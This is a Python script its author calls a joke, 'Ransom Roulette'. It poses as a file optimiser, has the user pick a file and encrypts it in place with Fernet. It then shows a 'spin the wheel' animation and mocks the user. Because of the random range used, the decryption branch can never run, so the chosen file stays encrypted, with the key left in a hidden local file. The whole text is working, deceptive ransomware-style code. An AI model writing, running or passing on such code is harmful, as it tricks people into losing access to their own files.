#This is a joke program called Ransom Roulette.  Was inspired by a girl I know on instagram.

#import modules
import time
import tkinter as tk
from tkinter import filedialog
from cryptography.fernet import Fernet
import random

from asciimatics.effects import Cycle, Cog
from asciimatics.renderers import FigletText
from asciimatics.scene import Scene
from asciimatics.screen import Screen

#start flow
key = Fernet.generate_key()
print('Im a totally innocent little python program that helps optimize file sizes!')
time.sleep(1)
print('Choose a file for me to optimize.')

root = tk.Tk()
root.withdraw()
file_path = filedialog.askopenfilename()

with open('.filekey.key', 'wb') as filekey:
    filekey.write(key)
fernet = Fernet(key)
with open(file_path, 'rb') as file:
    original = file.read()
encrypted = fernet.encrypt(original)
with open(file_path, 'wb') as encrypted_file:
    encrypted_file.write(encrypted)

print('Yeah just kidding that file is encrypted now,  Spin the wheel and you might get your file back.')    
time.sleep(3)

def demo(screen):
    effects = [
        Cycle(
        screen,
        FigletText('SPIN THE WHEEL', font='big'),
        int(screen.height / 10)),
        Cycle(
        screen,
        FigletText('Q', font='big'),
        int(screen.height / 2.5)),
        Cog(
        screen,
        radius= 10,
        direction= -1,
        x= screen.width / 2,
        y= screen.height / 2
        )
    ]
    
    screen.play([Scene(effects, duration=200)])
    

Screen.wrapper(demo)

wheelspin = random.randrange(1,6)
print(wheelspin)
if wheelspin > 5:
    with open(file_path, 'rb') as enc_file:
        encrypted = enc_file.read()
    decrypted = fernet.decrypt(encrypted)
    with open(file_path, 'wb') as dec_file:
        dec_file.write(decrypted)
    ui = input('''
Shit whell you win I guess...
Your file has been decrypted.
Want to play again?
          ''')
    if ui == 'yes' or 'y':
        quit()
    else: quit()
if wheelspin <= 5:
    print('''
Get Rekt kid.  Good luck decrypting that file.
''')

